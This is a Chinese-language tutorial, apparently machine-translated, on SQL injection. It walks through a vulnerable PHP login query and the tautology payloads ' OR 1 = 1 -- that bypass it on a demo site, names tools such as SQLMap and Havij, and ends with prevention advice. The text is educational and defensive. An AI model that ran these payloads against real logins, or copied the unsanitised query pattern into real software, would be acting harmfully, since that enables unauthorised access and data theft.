# SQL注入（二）

## 什么是 SQL 注入？

SQL 注入是一种攻击，它会对动态 SQL 语句进行毒害，注释掉语句的某些部分或附加始终为真的条件。它利用设计不良的 Web 应用程序中的设计缺陷来利用 SQL 语句执行恶意 SQL 代码。

数据是信息系统中最重要的组成部分之一。组织使用数据库驱动的 Web 应用程序从客户那里获取数据。[ SQL ](https://www.guru99.com/zh-CN/sql.html)是结构化查询语言的缩写。它用于检索和操作数据库中的数据。

[![SQL注入](https://www.guru99.com/images/EthicalHacking/Article_13_1.png)](https://www.guru99.com/images/EthicalHacking/Article_13_1.png)

***\*表中的内容：\****

- [什么是 SQL 注入？](https://www.guru99.com/zh-CN/learn-sql-injection-with-practical-example.html#what-is-a-sql-injection)
- [SQL 注入攻击如何工作？](https://www.guru99.com/zh-CN/learn-sql-injection-with-practical-example.html#how-sql-injection-attack-works)
- [黑客活动：SQL 注入 Web 应用程序](https://www.guru99.com/zh-CN/learn-sql-injection-with-practical-example.html#hacking-activity-sql-inject-a-web-application)
- [其他 SQL 注入攻击类型](https://www.guru99.com/zh-CN/learn-sql-injection-with-practical-example.html#other-sql-injection-attack-types)
- [SQL 注入的自动化工具](https://www.guru99.com/zh-CN/learn-sql-injection-with-practical-example.html#automation-tools-for-sql-injection)
- [如何Prev防范 SQL 注入攻击](https://www.guru99.com/zh-CN/learn-sql-injection-with-practical-example.html#how-to-prevent-against-sql-injection-attacks)
- [黑客活动：使用 Havij 进行 SQL 注入](https://www.guru99.com/zh-CN/learn-sql-injection-with-practical-example.html#hacking-activity-use-havij-for-sql-injection)
- [总结](https://www.guru99.com/zh-CN/learn-sql-injection-with-practical-example.html#summary)

## SQL 注入攻击如何工作？

使用 SQL 注入可以执行的攻击类型取决于数据库引擎的类型。 **攻击针对动态 SQL 语句**. 动态语句是在运行时使用来自 Web 表单或 URI 查询字符串的参数密码生成的语句。

### SQL 注入示例

让我们考虑一个带有登录表单的简单 Web 应用程序。HTML 表单的代码如下所示。

```
<form action=‘index.php’ method="post">

<input type="email" name="email" required="required"/>

<input type="password" name="password"/>

<input type="checkbox" name="remember_me" value="Remember me"/>

<input type="submit" value="Submit"/>

</form>
```

**这里，**

- 上述表格接受 email 地址和密码然后将其提交给[ PHP ](https://www.guru99.com/zh-CN/php-tutorials.html)名为index.php的文件。
- 它有一个将登录会话存储在 cookie 中的选项。我们从 Remember_me 检查中推断出这一点box。它使用 post 方法提交数据。这意味着值不会显示yed 在网址中。

假设后端检查用户ID的语句如下

```
SELECT * FROM users WHERE email = $_POST['email'] AND password = md5($_POST['password']);
```

**这里，**

- 上述语句使用的值 `$_POST[]` 直接排列而不进行任何清理。
- 密码采用MD5算法加密。

我们将使用sqlfiddle演示SQL注入攻击。打开URL http://sqlfiddle.com/ 在您的网络浏览器中。您将获得以下wing 窗口。

注意：你必须编写 SQL 语句

[![SQL注入有效](https://www.guru99.com/images/EthicalHacking/Article_13_2.png)](https://www.guru99.com/images/EthicalHacking/Article_13_2.png)

**步骤1）** 在左侧窗格中输入此代码

```
CREATE TABLE `users` (
  `id` INT NOT NULL AUTO_INCREMENT,
  `email` VARCHAR(45) NULL,
  `password` VARCHAR(45) NULL,
  PRIMARY KEY (`id`));
  
  
insert into users (email,password) values ('m@m.com',md5('abc'));
```

**步骤2）** 单击构建架构

**步骤3）** 在右侧窗格中输入此代码

```
select * from users;
```

**步骤4）** 单击“运行 SQL”。您将看到以下内容wing 导致

[![SQL注入有效](https://www.guru99.com/images/EthicalHacking/Article_13_3.png)](https://www.guru99.com/images/EthicalHacking/Article_13_3.png)

假设用户提供 **管理员@管理员.sys** 并 **1234** 作为密码。针对数据库执行的语句将是

```
SELECT * FROM users WHERE email = 'admin@admin.sys' AND password = md5('1234');
```

可以通过注释掉密码部分并附加一个始终为真的条件来利用上述代码。假设攻击者提供了以下内容wing 输入 email 地址字段。

```
xxx@xxx.xxx' OR 1 = 1 LIMIT 1 -- ' ]
```

xxx 作为密码。

生成的动态语句如下。

```
SELECT * FROM users WHERE email = 'xxx@xxx.xxx' OR 1 = 1 LIMIT 1 -- ' ] AND password = md5('1234');
```

**这里，**

- **xxx@xxx.xxx** 以单引号结尾，完成字符串引用
- `OR 1 = 1 `LIMIT 1 是一个始终为真的条件，并将返回的结果限制为仅有一条记录。
- — 'AND…是消除密码部分的SQL注释。

复制上述 SQL 语句并粘贴到 SQL Fiddle运行 SQL 文本 box 如下图所示，

[![SQL注入有效](https://www.guru99.com/images/EthicalHacking/Article_13_4.png)](https://www.guru99.com/images/EthicalHacking/Article_13_4.png)

## 黑客活动：SQL 注入 Web 应用程序

我们有一个简单的 Web 应用程序 http://www.techpanda.org/ **仅用于演示目的，容易受到 SQL 注入攻击。** 上面的 HTML 表单代码取自登录页面。该应用程序提供了基本的安全性，例如清理电子邮件mail 字段。这意味着我们上面的代码不能用于绕过登录。

为了解决这个问题，我们可以利用密码字段。下图显示了您必须遵循的步骤

[![SQL 注入 Web 应用程序](https://www.guru99.com/images/EthicalHacking/Article_13_5.png)](https://www.guru99.com/images/EthicalHacking/Article_13_5.png)

假设攻击者提供了以下内容wing 输入

- 步骤 1：输入 xxx@xxx.xxx 作为电子邮件mail 地址
- 步骤2：输入xxx') OR 1 = 1 — ]

[![SQL 注入 Web 应用程序](https://www.guru99.com/images/EthicalHacking/Article_13_6.png)](https://www.guru99.com/images/EthicalHacking/Article_13_6.png)

- 点击提交按钮
- 您将被引导至仪表板

生成的 SQL 语句如下

```
SELECT * FROM users WHERE email = 'xxx@xxx.xxx' AND password = md5('xxx') OR 1 = 1 -- ]');
```

下图说明该声明已生成。

[![SQL 注入 Web 应用程序](https://www.guru99.com/images/EthicalHacking/Article_13_7.png)](https://www.guru99.com/images/EthicalHacking/Article_13_7.png)

**这里，**

- 该语句智能地假设使用 md5 加密
- 完成单引号和右括号
- 为语句附加一个始终为真的条件

一般来说，一次成功的 SQL 注入攻击会尝试多种不同的技术（例如上面演示的技术）来发起成功的攻击。

## 其他 SQL 注入攻击类型

SQL 注入的危害远不止传递登录信息 algorithms. 一些攻击包括

- 删除数据
- 更新数据
- [插入数据](https://www.guru99.com/zh-CN/sql-pl-sql.html)
- 在服务器上执行命令，下载并安装木马等恶意程序
- 导出信用卡信息等有价值的数据tails和mail以及攻击者远程服务器的密码
- 获取用户登录信息tails 等。
- 基于cookie的SQL注入
- 基于错误的 SQL 注入
- 盲SQL注入

上面的列表并不详尽；它只是让你了解什么是 SQL 注入

## SQL 注入的自动化工具

在上面的例子中，我们根据自己对 SQL 的丰富知识使用了手动攻击技术。有一些自动化工具可以帮助您更有效地在最短的时间内执行攻击。这些工具包括

- SQLMap – http://sqlmap.org/
- JSQL注入 – https://tools.kali.org/vulnerability-analysis/jsql

## 如何Prev防范 SQL 注入攻击

组织可以采用以下方式wing 策略来保护自己免受 SQL 注入攻击。

- **永远不要相信用户输入——** 在动态 SQL 语句中使用它之前必须始终对其进行清理。
- **存储过程 –** 它们可以封装 SQL 语句并将所有输入视为参数。
- **准备好的声明 –** 通过首先创建 SQL 语句，然后将所有提交的用户数据视为参数，使准备好的语句能够正常工作。这对 SQL 语句的语法没有影响。
- **常用表达 -** 这些可用于检测潜在的有害代码并在执行 SQL 语句之前将其删除。
- **数据库连接用户访问权限 –** 只应向用于 [连接到数据库](https://www.guru99.com/zh-CN/introduction-to-database-sql.html). 这有助于减少 SQL 语句在服务器上执行的操作。
- **错误消息 –** 这些不应该 rev敏感信息以及错误发生的确切位置。简单的自定义错误消息，例如“抱歉，我们遇到了技术错误。已联系技术团队。请重试 later” 可以用来代替显示导致错误的 SQL 语句。

## 黑客活动：使用 Havij 进行 SQL 注入

在这个实际场景中，我们将使用 Havij Advanced SQL Injection 程序来扫描网站是否存在漏洞。

注意：您的 [防病毒程序](https://www.guru99.com/zh-CN/best-free-malware-removal.html) 可能会因其性质而将其标记。您应该将其添加到排除列表中或暂停您的防病毒软件。

下图显示了 Havij 的主窗口

[![使用 Havij 进行 SQL 注入](https://www.guru99.com/images/EthicalHacking/Article_13_8.png)](https://www.guru99.com/images/EthicalHacking/Article_13_8.png)

上述工具可用于评估网站/应用程序的漏洞。

## 总结

- SQL 注入是一种利用不良 SQL 语句的攻击类型
- SQL 注入可用于绕过登录 algorithms、检索、插入、更新和删除数据。
- SQL注入工具包括 SQLMap、SQLPing、SQLSmack等
- 编写SQL语句时良好的安全策略可以帮助减少SQL注入攻击。